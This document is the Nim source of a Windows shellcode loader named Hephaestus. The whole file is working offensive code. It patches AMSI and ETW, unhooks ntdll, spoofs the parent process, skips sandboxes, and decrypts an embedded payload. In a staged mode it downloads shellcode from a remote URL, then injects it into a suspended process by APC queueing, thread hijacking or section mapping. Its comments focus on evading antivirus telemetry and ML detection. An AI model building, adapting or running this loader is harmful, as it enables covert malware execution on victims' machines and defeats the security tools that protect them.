# Hephaestus shellcode loader
# Wraps Aphrodite (donut shellcode) with injection + evasion features.
# Compiled by builder.py via nim c --os:windows --cpu:amd64 -d:mingw
#
# Feature flags (passed as -d: at compile time):
#   useRc4        : RC4 decrypt payload before injection
#   useXor        : XOR decrypt payload before injection
#   sandboxCheck  : basic anti-sandbox (uptime, RAM, CPU, sleep skipping)
#   etwPatch      : patch EtwEventWrite -> xor eax,eax; ret
#   amsiPatch     : patch AmsiScanBuffer -> xor eax,eax; ret
#   ppidSpoof     : spawn target as child of explorer.exe
#   threadHijack  : RIP redirect instead of Early Bird APC
#   wipe          : zero shellcode buffer after injection
#   mapInject     : use NtCreateSection+NtMapViewOfSection instead of VirtualAllocEx
#                   (avoids NtAllocateVirtualMemory ETW MWTI telemetry - backed section)

import std/base64
import winim/lean
import winim/inc/tlhelp32
import keys

# -- Extra WinAPI not always in winim/lean --

type
  STARTUPINFOEXW {.pure.} = object
    StartupInfo: STARTUPINFOW
    lpAttributeList: pointer

const
  EXTENDED_STARTUPINFO_PRESENT* = DWORD(0x00080000)
  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS* = DWORD_PTR(0x00020000)

proc InitializeProcThreadAttributeList(
  lpAttrList: pointer, dwAttrCount: DWORD,
  dwFlags: DWORD, lpSize: ptr SIZE_T
): WINBOOL {.importc, stdcall, dynlib: "kernel32".}

proc UpdateProcThreadAttribute(
  lpAttrList: pointer, dwFlags: DWORD, Attribute: DWORD_PTR,
  lpValue: pointer, cbSize: SIZE_T,
  lpPreviousValue: pointer, lpReturnSize: ptr SIZE_T
): WINBOOL {.importc, stdcall, dynlib: "kernel32".}

proc DeleteProcThreadAttributeList(
  lpAttrList: pointer
) {.importc, stdcall, dynlib: "kernel32".}

proc VirtualProtectEx(
  hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T,
  flNewProtect: DWORD, lpflOldProtect: PDWORD
): WINBOOL {.importc, stdcall, dynlib: "kernel32".}

# -- Payload: embedded (base64) in default mode, downloaded at runtime in staged mode --
when not defined(staged):
  const encPayloadB64 = staticRead("payload.b64")

when defined(staged):
  # Staged loading: shellcode downloaded at runtime from stagingUrl.
  # The binary contains no payload at all, eliminating high-entropy sections
  # and dramatically reducing the ML detection surface.
  # Use uint32 directly to avoid DWORD distinct-type mismatch in Nim 2.x.
  const
    INET_PRECONFIG : uint32 = 0x00000000'u32
    INET_RELOAD    : uint32 = 0x80000000'u32
    INET_NOCACHE   : uint32 = 0x04000000'u32
    INET_PRAGMA    : uint32 = 0x00000100'u32
    INET_NOUI      : uint32 = 0x00000200'u32

  type HInet = pointer

  # Renamed procs (importc gives the real symbol name) to avoid winim namespace collisions
  proc inetOpen(agent: cstring, accessType: uint32,
                proxy: cstring, bypass: cstring, flags: uint32): HInet
    {.importc: "InternetOpenA", stdcall, dynlib: "wininet".}

  proc inetOpenUrl(hNet: HInet, url: cstring, headers: cstring,
                   headersLen: uint32, flags: uint32, ctx: uint): HInet
    {.importc: "InternetOpenUrlA", stdcall, dynlib: "wininet".}

  proc inetRead(hUrl: HInet, buf: pointer, toRead: uint32, nRead: ptr uint32): int32
    {.importc: "InternetReadFile", stdcall, dynlib: "wininet".}

  proc inetClose(h: HInet): int32
    {.importc: "InternetCloseHandle", stdcall, dynlib: "wininet".}

  proc downloadStage(): seq[byte] =
    let agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    let hNet = inetOpen(agent.cstring, INET_PRECONFIG,
                        cast[cstring](nil), cast[cstring](nil), 0'u32)
    if hNet == nil: return @[]
    defer: discard inetClose(hNet)

    let dlFlags = INET_RELOAD or INET_NOCACHE or INET_PRAGMA or INET_NOUI
    let hUrl = inetOpenUrl(hNet, stagingUrl.cstring, cast[cstring](nil),
                           0'u32, dlFlags, 0'u)
    if hUrl == nil: return @[]
    defer: discard inetClose(hUrl)

    var data = newSeq[byte](0)
    var chunk: array[8192, byte]
    var nRead: uint32 = 0
    while true:
      if inetRead(hUrl, addr chunk[0], uint32(sizeof(chunk)), addr nRead) == 0: break
      if nRead == 0: break
      let pos = data.len
      data.setLen(data.len + int(nRead))
      copyMem(addr data[pos], addr chunk[0], int(nRead))
    return data

# -- Dynamic ntdll resolution: no suspicious IAT entries for syscalls --
# NtQueueApcThread, NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection
# are resolved via GetProcAddress at runtime instead of static import.

when not defined(threadHijack):
  type FnNtQueueApcThread = proc(
    ThreadHandle: HANDLE, ApcRoutine: LPVOID,
    ApcArgument1, ApcArgument2, ApcArgument3: LPVOID
  ): LONG {.stdcall.}

  var pNtQueueApcThread: FnNtQueueApcThread = nil

when defined(mapInject):
  type NTSTATUS = LONG

  const
    SECTION_ALL_ACCESS_FLAG = DWORD(0x000F001F)
    SEC_COMMIT_FLAG         = DWORD(0x8000000)
    STATUS_SUCCESS_NT       = NTSTATUS(0)
    ViewUnmap               = DWORD(2)

  type
    FnNtCreateSection = proc(
      SectionHandle: ptr HANDLE, DesiredAccess: DWORD,
      ObjectAttributes: pointer, MaximumSize: ptr int64,
      SectionPageProtection: DWORD, AllocationAttributes: DWORD,
      FileHandle: HANDLE
    ): NTSTATUS {.stdcall.}

    FnNtMapViewOfSection = proc(
      SectionHandle: HANDLE, ProcessHandle: HANDLE,
      BaseAddress: ptr LPVOID, ZeroBits: uint,
      CommitSize: SIZE_T, SectionOffset: pointer,
      ViewSize: ptr SIZE_T, InheritDisposition: DWORD,
      AllocationType: DWORD, Win32Protect: DWORD
    ): NTSTATUS {.stdcall.}

    FnNtUnmapViewOfSection = proc(
      ProcessHandle: HANDLE, BaseAddress: LPVOID
    ): NTSTATUS {.stdcall.}

  var pNtCreateSection:      FnNtCreateSection      = nil
  var pNtMapViewOfSection:   FnNtMapViewOfSection   = nil
  var pNtUnmapViewOfSection: FnNtUnmapViewOfSection = nil

  proc mapViewInject(hProcess: HANDLE, sc: seq[byte]): LPVOID =
    var hSec: HANDLE = 0
    var sz = int64(sc.len)
    # Create pagefile-backed section with max RWX permissions
    if pNtCreateSection(addr hSec, SECTION_ALL_ACCESS_FLAG, nil, addr sz,
                        PAGE_EXECUTE_READWRITE, SEC_COMMIT_FLAG,
                        HANDLE(0)) != STATUS_SUCCESS_NT:
      return nil
    defer: CloseHandle(hSec)

    # Map locally as RW to write shellcode
    var localBase: LPVOID = nil
    var viewSz: SIZE_T = 0
    if pNtMapViewOfSection(hSec, GetCurrentProcess(), addr localBase, 0, 0, nil,
                           addr viewSz, ViewUnmap, 0,
                           PAGE_READWRITE) != STATUS_SUCCESS_NT:
      return nil

    copyMem(localBase, unsafeAddr sc[0], sc.len)
    discard pNtUnmapViewOfSection(GetCurrentProcess(), localBase)

    # Map remotely as RX - shared section, shellcode written above
    var remoteBase: LPVOID = nil
    viewSz = 0
    if pNtMapViewOfSection(hSec, hProcess, addr remoteBase, 0, 0, nil,
                           addr viewSz, ViewUnmap, 0,
                           PAGE_EXECUTE_READ) != STATUS_SUCCESS_NT:
      return nil

    return remoteBase

# -- RC4 --
when defined(useRc4):
  proc rc4Crypt(key: openArray[byte], data: var openArray[byte]) =
    var S: array[256, byte]
    for i in 0..255: S[i] = byte(i)
    var j = 0
    for i in 0..255:
      j = (j + int(S[i]) + int(key[i mod key.len])) and 0xFF
      swap(S[i], S[j])
    var x, y = 0
    for i in 0..<data.len:
      x = (x + 1) and 0xFF
      y = (y + int(S[x])) and 0xFF
      swap(S[x], S[y])
      data[i] = data[i] xor S[(int(S[x]) + int(S[y])) and 0xFF]

# -- XOR --
when defined(useXor):
  proc xorDecrypt(data: var openArray[byte]) =
    for i in 0..<data.len:
      data[i] = data[i] xor xorKey[i mod xorKey.len]

# -- Sandbox check --
when defined(sandboxCheck):
  proc doSandboxCheck(): bool =
    if uint64(GetTickCount64()) < 300_000'u64: return false
    var ms: MEMORYSTATUSEX
    ms.dwLength = DWORD(sizeof(ms))
    if GlobalMemoryStatusEx(addr ms) != 0:
      if uint64(ms.ullTotalPhys) < 2'u64 * 1024 * 1024 * 1024: return false
    var si: SYSTEM_INFO
    GetSystemInfo(addr si)
    if si.dwNumberOfProcessors < 2: return false
    let t0 = uint64(GetTickCount64())
    Sleep(500)
    if uint64(GetTickCount64()) - t0 < 400'u64: return false
    return true

# -- ntdll unhook: remap .text from clean disk copy --
when defined(unhook):
  proc unhookNtdll() =
    let hNtdll = GetModuleHandleA("ntdll.dll")
    if hNtdll == 0: return

    let hFile = CreateFileA(
      "C:\\Windows\\System32\\ntdll.dll",
      GENERIC_READ, FILE_SHARE_READ, nil,
      OPEN_EXISTING, 0, 0
    )
    if hFile == INVALID_HANDLE_VALUE: return
    defer: CloseHandle(hFile)

    let hMap = CreateFileMappingA(hFile, nil, PAGE_READONLY or SEC_IMAGE, 0, 0, nil)
    if hMap == 0: return
    defer: CloseHandle(hMap)

    let pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0)
    if pClean == nil: return
    defer: UnmapViewOfFile(pClean)

    let base = cast[int](hNtdll)
    let dos   = cast[ptr IMAGE_DOS_HEADER](base)
    let nt    = cast[ptr IMAGE_NT_HEADERS64](base + int(dos.e_lfanew))
    let firstSec = cast[int](nt) + 4 + sizeof(IMAGE_FILE_HEADER) +
                   int(nt.FileHeader.SizeOfOptionalHeader)

    for i in 0..<int(nt.FileHeader.NumberOfSections):
      let sec = cast[ptr IMAGE_SECTION_HEADER](
        firstSec + i * sizeof(IMAGE_SECTION_HEADER)
      )
      if sec.Name[0] == byte('.') and sec.Name[1] == byte('t') and
         sec.Name[2] == byte('e') and sec.Name[3] == byte('x') and
         sec.Name[4] == byte('t') and sec.Name[5] == byte(0):
        let textAddr = cast[LPVOID](base + int(sec.VirtualAddress))
        let textSize = SIZE_T(sec.Misc.VirtualSize)
        let cleanText = cast[LPVOID](cast[int](pClean) + int(sec.VirtualAddress))
        var old: DWORD
        if VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, addr old) != 0:
          copyMem(textAddr, cleanText, int(textSize))
          discard VirtualProtect(textAddr, textSize, old, addr old)
        break

# -- ETW patch (xor eax,eax; ret) --
when defined(etwPatch):
  proc patchEtw() =
    let h = GetModuleHandleA("ntdll.dll")
    if h == 0: return
    let p = cast[LPVOID](GetProcAddress(h, "EtwEventWrite"))
    if p == nil: return
    var patch: array[3, byte] = [0x33'u8, 0xC0'u8, 0xC3'u8]
    var old: DWORD
    if VirtualProtect(p, 3, PAGE_EXECUTE_READWRITE, addr old) != 0:
      copyMem(p, addr patch[0], 3)
      discard VirtualProtect(p, 3, old, addr old)

# -- AMSI patch (xor eax,eax; ret) --
when defined(amsiPatch):
  proc patchAmsi() =
    let h = LoadLibraryA("amsi.dll")
    if h == 0: return
    let p = cast[LPVOID](GetProcAddress(h, "AmsiScanBuffer"))
    if p == nil: return
    var patch: array[3, byte] = [0x33'u8, 0xC0'u8, 0xC3'u8]
    var old: DWORD
    if VirtualProtect(p, 3, PAGE_EXECUTE_READWRITE, addr old) != 0:
      copyMem(p, addr patch[0], 3)
      discard VirtualProtect(p, 3, old, addr old)

# -- Get explorer.exe PID for PPID spoof --
when defined(ppidSpoof):
  proc getExplorerPid(): DWORD =
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == INVALID_HANDLE_VALUE: return 0
    defer: CloseHandle(snap)
    var pe: PROCESSENTRY32W
    pe.dwSize = DWORD(sizeof(pe))
    if Process32FirstW(snap, addr pe) != 0:
      while true:
        var i = 0
        var name = ""
        while pe.szExeFile[i] != 0 and i < 260:
          name.add(char(pe.szExeFile[i]))
          inc i
        if name == "explorer.exe":
          return pe.th32ProcessID
        if Process32NextW(snap, addr pe) == 0: break
    return 0

# -- Main --
proc hMain() =
  when defined(sandboxCheck):
    if not doSandboxCheck(): return

  when defined(unhook):
    unhookNtdll()

  when defined(etwPatch):
    patchEtw()

  when defined(amsiPatch):
    patchAmsi()

  # Resolve ntdll syscalls at runtime so they are absent from the static IAT
  let hNtdll = GetModuleHandleA("ntdll.dll")

  when not defined(threadHijack):
    pNtQueueApcThread = cast[FnNtQueueApcThread](
      GetProcAddress(hNtdll, "NtQueueApcThread"))

  when defined(mapInject):
    pNtCreateSection = cast[FnNtCreateSection](
      GetProcAddress(hNtdll, "NtCreateSection"))
    pNtMapViewOfSection = cast[FnNtMapViewOfSection](
      GetProcAddress(hNtdll, "NtMapViewOfSection"))
    pNtUnmapViewOfSection = cast[FnNtUnmapViewOfSection](
      GetProcAddress(hNtdll, "NtUnmapViewOfSection"))

  # Load payload: download from staging URL, or decode embedded base64 blob
  when defined(staged):
    var sc = downloadStage()
    if sc.len == 0: return
    when defined(useRc4):
      rc4Crypt(rc4Key, sc)
    elif defined(useXor):
      xorDecrypt(sc)
  else:
    let decoded = decode(encPayloadB64)
    var sc = newSeq[byte](decoded.len)
    for i in 0..<decoded.len:
      sc[i] = byte(decoded[i])
    when defined(useRc4):
      rc4Crypt(rc4Key, sc)
    elif defined(useXor):
      xorDecrypt(sc)

  # Prepare process creation
  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  si.cb = DWORD(sizeof(si))

  var target = newWideCString(targetProcess)

  when defined(ppidSpoof):
    var siex: STARTUPINFOEXW
    siex.StartupInfo = si
    siex.StartupInfo.cb = DWORD(sizeof(siex))

    var palSize: SIZE_T = 0
    discard InitializeProcThreadAttributeList(nil, 1, 0, addr palSize)
    var palBuf = newSeq[byte](int(palSize))
    let pal = cast[pointer](addr palBuf[0])

    if InitializeProcThreadAttributeList(pal, 1, 0, addr palSize) != 0:
      let epid = getExplorerPid()
      if epid != 0:
        let hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, epid)
        if hParent != 0:
          var ph = hParent
          discard UpdateProcThreadAttribute(
            pal, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            addr ph, SIZE_T(sizeof(HANDLE)), nil, nil
          )
      siex.lpAttributeList = pal

    discard CreateProcessW(
      nil, target, nil, nil, FALSE,
      CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT,
      nil, nil, cast[LPSTARTUPINFOW](addr siex), addr pi
    )
    DeleteProcThreadAttributeList(pal)
  else:
    discard CreateProcessW(
      nil, target, nil, nil, FALSE,
      CREATE_SUSPENDED,
      nil, nil, addr si, addr pi
    )

  if pi.hProcess == 0: return

  # -- Memory allocation / shellcode write --
  var remote: LPVOID = nil

  when defined(mapInject):
    # NtCreateSection + NtMapViewOfSection - no VirtualAllocEx, no MWTI ETW event
    remote = mapViewInject(pi.hProcess, sc)
    when defined(wipe):
      zeroMem(addr sc[0], sc.len)
    if remote == nil:
      CloseHandle(pi.hThread)
      CloseHandle(pi.hProcess)
      return
  else:
    # Classic VirtualAllocEx path
    remote = VirtualAllocEx(
      pi.hProcess, nil, SIZE_T(sc.len),
      MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
    )
    if remote == nil:
      CloseHandle(pi.hThread)
      CloseHandle(pi.hProcess)
      return
    var written: SIZE_T
    discard WriteProcessMemory(pi.hProcess, remote, addr sc[0], SIZE_T(sc.len), addr written)
    when defined(wipe):
      zeroMem(addr sc[0], sc.len)
    var old: DWORD
    discard VirtualProtectEx(pi.hProcess, remote, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)

  # -- Execution trigger --
  when defined(threadHijack):
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_FULL
    discard GetThreadContext(pi.hThread, addr ctx)
    ctx.Rip = cast[DWORD64](remote)
    discard SetThreadContext(pi.hThread, addr ctx)
    discard ResumeThread(pi.hThread)
  else:
    # Early Bird APC queued before thread entry point executes
    discard pNtQueueApcThread(pi.hThread, remote, nil, nil, nil)
    discard ResumeThread(pi.hThread)

  CloseHandle(pi.hThread)
  CloseHandle(pi.hProcess)

hMain()
